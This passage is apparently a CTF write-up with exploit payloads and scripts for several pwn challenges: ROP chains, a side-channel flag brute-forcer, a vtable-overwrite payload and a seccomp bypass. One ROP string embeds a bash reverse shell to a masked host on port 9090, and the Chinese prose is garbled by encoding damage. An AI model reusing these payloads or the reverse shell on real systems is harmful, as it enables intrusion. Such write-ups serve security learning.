</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;gg&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;ff&#34;:&#34;aaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;ee&#34;:&#34;aaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;dd&#34;:&#34;aaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;zz&#34;:&#34;zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\&#34;bbbbbb\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u3100\u0000\u0000\u0000\u404e\ucfa6\uae7f\u0000&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;address&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;rop&#34;:&#34;\u0000\u0000\u0000\u0000\ua0eb\ub007\u4056\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u98ec\ub007\u4056\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/touch\u2020/ctf/work/asddd&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;rops&#34;:&#34;aaaaaaaa\u804e\ucfa6\uae7f\u0000\&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u50f0\uc5a6\uae7f\u0000\u804e\ucfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u25e7\ub7a6\uae7f\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u784f\ucfa6\uae7f\u0000\u5f83\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\u5100\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u9697\ub5a6\uae7f\u0000\ub04f\ucfa6\uae7f\u0000\u0fb9\ub5a6\uae7f\u0000\u0000\u0000\u0000\u0000\ucde1\ubfa6\uae7f\u0000\u0000\u0000\u0000\u0000\u50be\ub7a6\uae7f\u0000/bin/bash\u2020-c\u2020\u2022/bin/bash\u2020-i\u2020&gt;&amp;/dev/tcp/xxx.xxx.xxx.xx/9090\u20200&gt;&amp;1\u2022&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &#34;rops&#34;:&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><h3 id=christmas-song>Christmas Song</h3><p>é€†å‘scan.l å’Œ parser.yæ–‡ä»¶å¾—åˆ°slangè¯­è¨€è¯­æ³•æ–‡æ³•</p><p>é€šè¿‡call function open flag read flag ç„¶ååˆ©ç”¨strncmpä¾§ä¿¡é“çˆ†ç ´flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sh = remote(&#39;124.71.144.133&#39;, 2144)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift work is &#34;12345678901234567890123456789012345678901234567890&#34;;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift path is &#34;/home/ctf/flag&#34;;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift oflag is 0;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift temp is 0;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift Size is 48;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift fd is 0;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift flag is &#34;</span><span class=si>{0}</span><span class=s1>&#34;;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift Ans is 1;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift zero is 0;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>gift flagsize is </span><span class=si>{1}</span><span class=s1>;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>reindeer Dancer delivering gift path oflag temp brings back gift fd;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>reindeer Dasher delivering gift fd work Size;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>reindeer Prancer delivering gift work flag flagsize brings back gift Ans;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>this family wants gift Ans if the gift is Ans equal to zero : reindeer Rudolph delivering gift path oflag temp brings back gift fd; ok, they should already have a gift;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>EOF
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;SCTF{Merry&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cnt</span>  <span class=o>=</span> <span class=mi>11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>stringset</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>printable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>stringset</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>temp</span> <span class=o>=</span> <span class=n>flag</span> <span class=o>+</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;124.71.144.133&#39;</span><span class=p>,</span> <span class=mi>2144</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;(EOF to finish):&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>temp</span><span class=p>,</span> <span class=n>cnt</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># log.success(payload.format(temp, cnt))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;error:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>cnt</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;flag=&#39;</span> <span class=o>+</span> <span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=christmas-bash>Christmas Bash</h3><p>åœ¨å¼€å§‹æ—¶å€™å°†sleepå˜é‡çš„å€¼è®¾ç½®æˆäº†libcä¸­sleepå¯ä»¥ç”¨æ­¤æ±‚å‡ºlibcbase</p><p>ç„¶åå°†_IO_2_1_stdout_çš„vtableä¸­çš„_IO_file_jumpsæ”¹ä¸ºsystem, åˆ©ç”¨printfå³å¯è§¦å‘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl> <span class=n>gift</span> <span class=n>libcbase</span> <span class=n>is</span> <span class=n>sleep</span> <span class=o>-</span> <span class=mi>972880</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>target</span> <span class=n>is</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mi>2205080</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>system</span> <span class=n>is</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mi>346848</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>Stdout</span> <span class=n>is</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mi>2201440</span> <span class=o>+</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>heap</span> <span class=n>is</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mi>2198720</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=k>var</span> <span class=n>is</span> <span class=s2>&#34;12345678&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>Binsh</span> <span class=n>is</span> <span class=s2>&#34;;/home/ctf/getflag &gt;&amp;2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>Size</span> <span class=n>is</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>tmp</span> <span class=n>is</span> <span class=mi>30</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>filename</span> <span class=n>is</span> <span class=s2>&#34;wood&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=n>offset</span> <span class=n>is</span> <span class=mi>1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=k>var</span> <span class=n>is</span> <span class=k>var</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reindeer</span> <span class=n>Vixen</span> <span class=n>delivering</span> <span class=n>gift</span> <span class=n>target</span> <span class=k>var</span> <span class=n>Size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reindeer</span> <span class=n>Vixen</span> <span class=n>delivering</span> <span class=n>gift</span> <span class=n>Stdout</span> <span class=n>Binsh</span> <span class=n>tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reindeer</span> <span class=n>Dancer</span> <span class=n>delivering</span> <span class=n>gift</span> <span class=n>filename</span> <span class=n>Size</span> <span class=n>Size</span><span class=p>;</span> 
</span></span></code></pre></td></tr></table></div></div><h3 id=gadget>Gadget</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”¨ seccomp é™åˆ¶äº† syscall åªèƒ½æœ‰ (fstat)5 å’Œ (read) 0ã€‚</p><p>äºæ˜¯é—®é¢˜å˜æˆäº†ï¼Œå¦‚ä½•æ‰èƒ½æ‰“å¼€ flag æ–‡ä»¶ã€‚æŸ¥è¯¢ syscall ä¹‹åå‘ç°ï¼Œåœ¨ i386 æ¶æ„ä¸‹ï¼Œsyscall number 5 æ˜¯ openã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ‡æ¢åˆ° 32 ä½çš„æ–¹å¼æ¥æ‰“å¼€ flagï¼Œç„¶åå†åˆ‡æ¢å› 64 ä½æ¨¡å¼æ¥è¯»å– flagã€‚</p><p>ä½†æ˜¯ä»ç„¶è¿˜æœ‰é—®é¢˜ï¼Œå¹¶æ²¡æœ‰ä¸€ä¸ª syscall å¯ä»¥å†™ flag åˆ°è¾“å‡ºï¼Œäºæ˜¯æˆ‘ä»¬åªèƒ½è®¾è®¡ä¸€ä¸ªæ–¹æ³•è®©è¿œç¨‹èƒ½å¤Ÿåˆ¤æ–­ flag æŸä¸€ä½æ˜¯ä¸æ˜¯æŸä¸€ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªæ–¹æ³•æœ‰å¾ˆå¤šï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ï¼Œåœ¨ gadget çš„æœ€åæ”¾ä¸€ä¸ª read stdin çš„æ“ä½œï¼Œè¿™æ ·å°±èƒ½è®© ROP æ‰§è¡Œå®Œä¹‹åå¡ä½ã€‚ä½†æ˜¯åœ¨å¡ä½ä¹‹å‰ï¼Œä¼šå°è¯•å¾€ä¸€ä¸ªé‚»è¿‘è¾¹ç•Œçš„åœ°å€ + å½“å‰ flag å­—ç¬¦çš„ä½ç½®å†™å…¥å†…å®¹ï¼Œå¦‚æœè¶Šç•Œäº†å°±å´©æºƒï¼ˆè¿™æ ·ç¨‹åºç»“æŸä¹‹åä¹Ÿå°±ä¸ä¼šå¡ä½äº†ï¼‰ï¼Œå¦‚æœæ²¡æœ‰è¶Šç•Œå°±ä¸ä¼šå´©æºƒã€‚é€šè¿‡è¿™æ ·çš„æ–¹å¼å°±å¯ä»¥åˆ¤æ–­ã€‚</p><p>ç”±äº read å‡½æ•°æ¯æ¬¡åªèƒ½è¯»å…¥ä¸åˆ° 200 ä¸ªå­—ç¬¦ï¼Œæœ€åæˆ‘æŠŠ ROP åˆ†æˆäº†å››ä¸ªé˜¶æ®µï¼Œå…·ä½“ exploit è„šæœ¬å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>zio</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LOCAL</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;./gadget.patched&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;TARGET&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ary</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;TARGET&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
